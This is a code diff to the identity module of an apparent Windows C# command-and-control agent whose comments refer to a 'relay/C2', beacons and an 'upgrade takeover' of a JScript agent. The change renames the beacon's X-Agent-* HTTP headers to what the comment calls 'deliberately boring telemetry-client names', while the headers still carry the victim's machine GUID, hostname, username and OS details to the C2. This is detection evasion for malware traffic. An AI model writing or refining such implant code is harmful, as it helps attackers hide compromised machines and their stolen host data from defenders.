@@ -4,11 +4,12 @@ using System.Runtime.InteropServices;
 
 namespace CSharpAgent
 {
-    // Builds the X-Agent-* identity header set (API 1) — the SAME contract the JScript agent
+    // Builds the identity header set (API 1 — X-Device-Id et al., deliberately boring
+    // telemetry-client names) — the SAME contract the JScript agent
     // ships, so an upgrade takeover keeps ONE stable agent row: the UUID is the same MachineGuid
     // the JScript agent reads, and every field is derived the same way. The differences from
-    // the JScript agent are exactly two: X-Agent-Name-Id is 2 (this breed) and
-    // X-Agent-Capabilities carries ONLY the UpgradeNative bit (category 4 → 1000000000000000).
+    // the JScript agent are exactly two: X-Client-Id is 2 (this breed) and
+    // X-Client-Features carries ONLY the UpgradeNative bit (category 4 → 1000000000000000).
     internal static class Identity
     {
         internal const string Capabilities = "1000000000000000";
@@ -16,7 +17,7 @@ namespace CSharpAgent
 
         // A RANDOM per-RUNTIME key — NOT identity. A fresh value on every process launch
         // (one static initializer per AppDomain; Beacon.Run sends these headers on every
-        // POST), shipped as X-Agent-Session-Key so the relay/C2 can tell agent RUNTIMES
+        // POST), shipped as X-Session-Id so the relay/C2 can tell agent RUNTIMES
         // apart on one machine: the machine uuid stays THE identity rows are keyed by, the
         // session key distinguishes concurrent or succeeding processes — after a 0x0B
         // UpgradeNetFramework takeover the beacons of the SAME machine uuid carry a NEW
@@ -50,19 +51,19 @@ namespace CSharpAgent
             // which.
             var headers = new List<string[]>
             {
-                new[] { "X-Agent-Api-Version", "1" },
-                new[] { "X-Agent-Platform", "Windows" },
-                new[] { "X-Agent-Name-Id", BreedId.ToString() },
-                new[] { "X-Agent-Capabilities", Capabilities }
+                new[] { "X-Api-Version", "1" },
+                new[] { "X-Platform", "Windows" },
+                new[] { "X-Client-Id", BreedId.ToString() },
+                new[] { "X-Client-Features", Capabilities }
             };
-            AddOptional(headers, "X-Agent-Machine-Uuid", guid);
-            AddOptional(headers, "X-Agent-Session-Key", SessionKey);
-            AddOptional(headers, "X-Agent-Hostname", Environment.MachineName);
-            AddOptional(headers, "X-Agent-Username", Environment.UserName);
-            AddOptional(headers, "X-Agent-Arch", machineArch);
-            AddOptional(headers, "X-Agent-Process-Arch", processArch);
-            AddOptional(headers, "X-Agent-Os-Version", version);
-            AddOptional(headers, "X-Agent-Build", BuildNumber(version));
+            AddOptional(headers, "X-Device-Id", guid);
+            AddOptional(headers, "X-Session-Id", SessionKey);
+            AddOptional(headers, "X-Device-Name", Environment.MachineName);
+            AddOptional(headers, "X-User-Id", Environment.UserName);
+            AddOptional(headers, "X-Device-Arch", machineArch);
+            AddOptional(headers, "X-App-Arch", processArch);
+            AddOptional(headers, "X-OS-Version", version);
+            AddOptional(headers, "X-OS-Build", BuildNumber(version));
             return headers.ToArray();
         }
 
@@ -222,7 +223,7 @@ namespace CSharpAgent
 
         // OS version via RtlGetVersion — the truthful source (Environment.OSVersion inherits
         // the host manifest's compatibility lies on Windows 8.1+; the JScript agent uses WMI
-        // for the same reason). Format: "major.minor.build" — X-Agent-Build is its tail.
+        // for the same reason). Format: "major.minor.build" — X-OS-Build is its tail.
         private static string OsVersion()
         {
             try
